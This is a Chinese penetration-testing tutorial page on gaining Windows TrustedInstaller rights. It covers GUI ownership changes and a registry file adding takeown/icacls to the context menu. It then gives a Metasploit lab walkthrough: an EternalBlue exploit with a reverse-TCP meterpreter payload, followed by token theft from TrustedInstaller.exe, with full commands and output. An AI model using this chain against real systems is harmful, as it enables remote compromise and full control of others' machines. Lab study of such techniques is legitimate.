@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<!--Copyright©QingSword.COM︻☼1010D>-->
+<!--Copyright©X.QingSword.COM︻☼1010D>-->
+<html lang="zh-cn">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
+	<meta name="keywords" content="晴刃,晴,qing,qingsword,ccna图文笔记,ubuntu,linux,ubuntu server,mysql,python,计算机技术博客,渗透测试,kali渗透测试,kali,kali web渗透,kali主机渗透,kali无线渗透,metasploit,白帽子测试">
+	<meta name="keywords" content="晴刃,晴,qing,qingsword,ccna图文笔记,ubuntu,linux,ubuntu server,mysql,node.js,javascript,python,计算机技术博客">
+	<meta name="author" content="x.qingsword.com">
+	<title>[Metasploit]-7-如何获得Windows最高TrustedInstaller权限 - X.QingSword.COM</title>
+	<link rel="shortcut icon" type="image/x-icon" href="../logo/favicon.ico">
+	<link rel="stylesheet" type="text/css" href="../css/basic.css">
+	<link rel="stylesheet" type="text/css" href="../css/text.css">
+	<!-- 代码块高亮js -->
+	<link type="text/css" rel="stylesheet" href="../plugins/SyntaxHighlighter/styles/shCore.css"/>
+	<link type="text/css" rel="stylesheet" href="../plugins/SyntaxHighlighter/styles/shThemeRDark.css"/>
+	<script type="text/javascript" src="../plugins/SyntaxHighlighter/scripts/shCore.js"></script>
+	<script type="text/javascript" src="../plugins/SyntaxHighlighter/scripts/shBrushBash.js"></script>
+	<script type="text/javascript">
+	SyntaxHighlighter.all();
+	</script>
+</head>
+<body>
+	<!--header -->
+	<header id="nav">
+			<div class="nav-container"> 
+				<!-- 根大纲-->
+				<a href="http://x.qingsword.com" title="晴刃">
+					<h1 class="nav-logo">晴刃</h1>
+				</a>
+				<h2 class="nav-site-description desc-hidden">
+					He lies somewhere here
+				</h2>
+				<nav class="nav-links"> 
+					<!-- nav连接大纲-->
+					<h1 style="display:none;">网站导航</h1> 
+					<ul>
+						<li  class="active li-hidden">
+							<a href="../index.html" title="home">
+								<span class="link-word"><img src="../logo/home.png" alt="home" class="link-img">首页</span>
+							</a>
+						</li>
+						<li class="li-hidden">
+							<a href="../pt.html" title="pt">
+								<span class="link-word"><img src="../logo/linux.png" alt="pt" class="link-img">渗透<span class="word-hidden">技术</span></span>
+							</a>
+						</li>
+						<li >
+							<a href="../sitemap.html" title="sitemap">
+								<span class="link-word"><img src="../logo/archives.png" alt="archives" class="link-img"><span class="word-hidden">文章</span>归档</span>
+							</a>
+						</li>
+					</ul>
+				</nav>
+			</div>		
+	</header>
+	<!-- /header -->
+
+	<!-- content-->
+	<div id="content">
+		<div class="content-container">
+			<!-- 文章区 -->
+			<article class="text-container">
+				<header class="text-header">
+					<h1>[Metasploit]-7-如何获得Windows最高TrustedInstaller权限</h1>	
+				</header><!-- /header -->
+				<section class="text-body">
+					<h2>引言</h2>
+					<p>说到Windows权限，可能很多人都知道Administrator是"系统管理员"，其实在这之上，还存在一个"SYSTEM"权限，俗称"系统权限"，但Windows最高级的权限并非"系统权限"，而是一个叫做"TrustedInstaller"的隐藏权限，拥有这种权限的进程，能够在系统运行过程中，任意更改删除系统盘下所有文件，"TrustedInstaller"权限拥有对系统的"完全控制"权。</p>
+					<!-- 目录 -->
+					<h2>文章目录</h2>
+					<ul class="contents">	
+						 <li><a href="#Metasploit-Get-TrustedInstaller-1">0×1.TrustedInstaller权限介绍</a></li>
+						 <li><a href="#Metasploit-Get-TrustedInstaller-2">0×2.如何通过图形界面获得Windows系统TrustedInstaller权限</a></li>
+						 <li><a href="#Metasploit-Get-TrustedInstaller-3">0×3.如何通过注册表获得Windows系统TrustedInstaller权限</a></li>
+						 <li><a href="#Metasploit-Get-TrustedInstaller-4">0×4.如何通过Metasploit获得Windows系统TrustedInstaller权限</a></li>
+					 </ul>
+					<!-- /目录 -->
+
+					<!-- 正文 -->
+					
+					<h2 id="Metasploit-Get-TrustedInstaller-1">0×1.TrustedInstaller权限介绍</h2>
+
+					<p>在Win7之后的Windows系统中，微软公司对系统部分目录权限做了调整，在WinXP下最高级的"SYSTEM"权限，在Win7系统中对系统分区中部分特殊目录也仅仅只有"读取与执行"的权限，下面以系统盘中Windows目录下的文件举例。</p>
+					<p>如下图所示，在系统盘Windows目录中"wirte.exe"写字板程序，查看文件属性，发现除了"TrustedInstaller"这个虚拟组，其它三个组对文件的权限全部只有"读写与执行"，并且这些文件的所有者，全部是"TrustedInstaller"：</p>
+					<img src="images/Metasploit-Get-TrustedInstaller-1.jpg" alt="images/Metasploit-Get-TrustedInstaller-1.jpg">
+					<p>笔者登录系统所用账户为"Administrator"，我们尝试着重命名一下这个文件，发现被系统阻止，弹出如下对话框，提示"您需要TrustedInstaller提供的权限才能对此文件进行更改"：</p>
+					<img src="images/Metasploit-Get-TrustedInstaller-2.jpg" alt="images/Metasploit-Get-TrustedInstaller-2.jpg">
+					<p>然后笔者尝试使用管理员权限的cmd，使用"move"命令去更改这个文件的名称，提示"拒绝访问"：</p>
+					<pre class="brush: bash;">
+					C:\Users\Administrator&gt;cd \
+					C:\&gt;cd windows
+					C:\Windows&gt;move write.exe qingsword.com.exe
+					拒绝访问。
+					移动了         0 个文件。
+					</pre>
+					<p>由此可以看出，只有"TrustedInstaller"权限，才具有对系统的完全控制权，相当于Linux中的root权限。</p>
+
+					<h2 id="Metasploit-Get-TrustedInstaller-2">0×2.如何通过图形界面获得Windows系统TrustedInstaller权限</h2>
+					
+					<p>对于这些"TrustedInstaller"才有完整控制权限的文件，其文件的"所有者"也是"TrustedInstaller"：</p>
+					<img src="images/Metasploit-Get-TrustedInstaller-3.jpg" alt="images/Metasploit-Get-TrustedInstaller-3.jpg">
+
+					<p>知道了这点，实际上在图形界面下，获得单个文件的完全控制权十分简单，要获得这个文件的最高控制权，实际上只需要将文件所有者替换成我们当前用户（普通用户能否替换文件所有者没有测试过，本文使用Administrator权限替换所有者，测试通过），然后将文件控制属性"完全控制"勾选即可：</p>
+					<p class="indent-p">依次打开-&gt;文件属性-&gt;安全-&gt;高级-&gt;所有者-&gt;编辑-&gt;选择"Administrator"账户-&gt;确定</p>
+					<img src="images/Metasploit-Get-TrustedInstaller-4.jpg" alt="images/Metasploit-Get-TrustedInstaller-4.jpg">
+
+					<p>更改了文件"所有者"后，回到文件属性窗口，编辑文件属性，将Administrator权限下面"完全控制"勾选上，现在，我们对这个文件就拥有了完全控制权：</p>
+					<img src="images/Metasploit-Get-TrustedInstaller-5.jpg" alt="images/Metasploit-Get-TrustedInstaller-5.jpg">
+					<p>使用上面这种方法，如果我们想获得十几个文件的完全控制权，需要一个个去更改，十分麻烦，那么就可以使用下面的方法，通过注册表的方式来获得系统TrustedInstaller权限。</p>
+
+					<h2 id="Metasploit-Get-TrustedInstaller-3">0×3.如何通过注册表获得Windows系统TrustedInstaller权限</h2>
+
+					<p>打开一个记事本，将下面这段注册表命令复制进去，然后保存成.reg后缀的文件，之后双击导入，[<a title="通过注册表获取系统TrustedInstaller权限" href="src/trustedinstaller.txt" target="_blank" rel="nofollow">点击这里</a>]查看复制注册表代码：</p>
+					<pre class="brush: bash;">
+					Windows Registry Editor Version 5.00
+
+					[HKEY_CLASSES_ROOT\*\shell\runas]
+					@="获取TrustedInstaller权限"
+
+					[HKEY_CLASSES_ROOT\*\shell\runas\command]
+					@="cmd.exe /c takeown /f \"%1\" &amp;&amp; icacls \"%1\" /grant administrators:F"
+					"IsolatedCommand"="cmd.exe /c takeown /f \"%1\" &amp;&amp; icacls \"%1\" /grant administrators:F"
+
+					[HKEY_CLASSES_ROOT\Directory\shell\runas]
+					@="获取TrustedInstaller权限"
+					"NoWorkingDirectory"=""
+
+					[HKEY_CLASSES_ROOT\Directory\shell\runas\command]
+					@="cmd.exe /c takeown /f \"%1\" /r /d y &amp;&amp; icacls \"%1\" /grant administrators:F /t"
+					"IsolatedCommand"="cmd.exe /c takeown /f \"%1\" /r /d y &amp;&amp; icacls \"%1\" /grant administrators:F /t"
+					</pre>
+
+					<p>导入之后，在鼠标右键菜单中就会多出一个"获取TrustedInstaller权限"的选项，我们只需要对想获取"TrustedInstaller"权限的文件夹右击，点击此选项即可让这个文件夹包括下面的所有文件，全部获取到"TrustedInstaller"权限（慎用）。</p>
+
+
+					<h2 id="Metasploit-Get-TrustedInstaller-4">0×4.如何通过Metasploit获得Windows系统TrustedInstaller权限</h2>
+
+					<p>这一小节才是本文的重点，在第九篇文章中会介绍到Payload的生成与替换，就会使用到本小节中的内容，在上面的实例中已经演示了如何使用图形化界面来获取系统TrustedInstaller权限，这一节将结合Metasploit来实现TrustedInstaller权限的获取。</p>
+
+					<p>思路是这样的，首先我们通过"永恒之蓝"漏洞，获取目标靶机的Meterpreter ShellCode，然后利用系统shell，使用sc命令启动系统"Windows Modules Installer"服务，此服务启动后，会执行一个"TrustedInstaller.exe"程序，此程序本身就具有TrustedInstaller权限，最后在msf中利用incognito模块，窃取"TrustedInstaller.exe"程序的Token（Token在系统中，相当于一个权限令牌，不同程序进程都具有不同的Token权限，窃取了哪个程序的Token，就具有那个程序对应的权限）。</p>
+
+					<p>实验环境如下：</p>
+					<p class="indent-p">
+						×攻击主机 Kali 192.168.80.158 <br>
+						×目标靶机 Windows2008 x64 192.168.80.139
+					</p>
+					<pre class="brush: bash;">
+					#首先，使用"永恒之蓝"漏洞获取目标靶机的Meterpreter ShellCode
+					root@qingsword.com:~# msfdb run
+					msf &gt; use exploit/windows/smb/ms17_010_eternalblue
+					msf exploit(windows/smb/ms17_010_eternalblue) &gt; set rhost 192.168.80.139
+					rhost =&gt; 192.168.80.139
+					msf exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp
+					payload =&gt; windows/x64/meterpreter/reverse_tcp
+					msf exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 192.168.80.158
+					lhost =&gt; 192.168.80.158
+					msf exploit(windows/smb/ms17_010_eternalblue) &gt; set lport 9876
+					lport =&gt; 9876
+					msf exploit(windows/smb/ms17_010_eternalblue) &gt; exploit
+
+					meterpreter &gt; 
+
+					#加载incognito模块
+					meterpreter &gt; load incognito 
+					Loading extension incognito Success
+
+					#做个小实验，查看当前权限为SYSTEM，利用incognito模块来窃取普通用户的token权限，让Meterpreter ShellCode降权成为普通用户
+
+					#先查看下当前权限，是SYSTEM
+					meterpreter &gt; getuid
+					Server username: NT AUTHORITY\SYSTEM
+
+					#查看一下系统当前进程列表，在列表这种发现几个普通用户的进程，拿explorer.exe进程来举例，它拥有于Administrator用户权限
+					meterpreter &gt; ps
+					2432  1236  explorer.exe  x64   WIN-9PV48KN2GGU\Administrator
+
+					#窃取explorer.exe进程token
+					meterpreter &gt; steal_token 2432
+					Stolen token with username: WIN-9PV48KN2GGU\Administrator
+
+					#发现当前ShellCode变成了Administrator权限，这个权限就是我们从explorer.exe窃取到的
+					meterpreter &gt; getuid
+					Server username: WIN-9PV48KN2GGU\Administrator
+
+					#返回之前的SYSTEM权限
+					meterpreter &gt; drop_token 
+					Relinquished token, now running as: WIN-9PV48KN2GGU\Administrator
+					meterpreter &gt; getuid
+					Server username: NT AUTHORITY\SYSTEM
+
+					#进入系统shell，启动"Windows Modules Installer"服务
+					meterpreter > shell
+					C:\Windows\system32>sc start trustedinstaller
+
+					#退出系统shell，找到TrustedInstaller.exe程序PID，窃取TrustedInstaller.exe的token权限
+					C:\Windows\system32>exit
+					meterpreter &gt; ps
+					448   492   TrustedInstaller.exe  x64
+
+					#在这里，msf虽然显示我们窃取的token是SYSTEM权限的，实际上我们已经具备了TrustedInstaller权限
+					meterpreter &gt; steal_token 448
+					Stolen token with username: NT AUTHORITY\SYSTEM
+
+					#再次进入系统shell
+					meterpreter &gt; shell
+
+					#使用下面的命令来确定，如果输出中包含"NT SERVICE\TrustedInstaller"，说明我们窃取token成功了
+					C:\Windows\system32&gt;whoami /groups | findstr TrustedInstaller
+
+					NT SERVICE\TrustedInstaller
+
+					#尝试着更改一下系统目录下所有者是"TrustedInstaller"的程序文件名
+					C:\Windows\system32>move osk.exe osk.bk
+					成功
+					C:\Windows\system32>move osk.bk osk.exe
+					成功
+					</pre>
+
+					<p>对文中文字实例不是很明白的朋友，可以[<a title="qingsword制作TrustedInstaller提权小视频" href="https://pan.baidu.com/s/15JhW512M9cWxykgJvyhgRA" target="_blank" rel="nofollow">点击这里</a>][提取码 12j3]下载文章配套小视频观看。</p>
+					
+					<!-- /正文 -->
+
+
+				<footer class="text-footer">
+					<p>
+						*转载请注明来自:<a title="晴刃-自由、互助、分享、专注计算机技术。" href="http://x.qingsword.com" target="_blank">晴刃(X.QingSword.COM)</a>
+					</p>
+					<p>*原文连接:<a title="[Metasploit]-7-如何获得Windows最高TrustedInstaller权限" href="https://x.qingsword.com/qing/Metasploit-7.html" target="_blank">https://x.qingsword.com/qing/Metasploit-7.html</a></p>
+				</footer>
+			</article>
+			<!-- /文章区 -->	
+		</div>
+	</div>
+	<!-- /content -->
+	
+	<!-- footer -->
+	<footer id="footer">
+		<div class="footer-container">
+			QingSword.COM &nbsp;<img src="../logo/by-nc-sa.png" alt="Creative Commons" title="Creative Commons">
+		</div>
+	</footer>
+	<!-- /footer -->
+</body>
+</html>
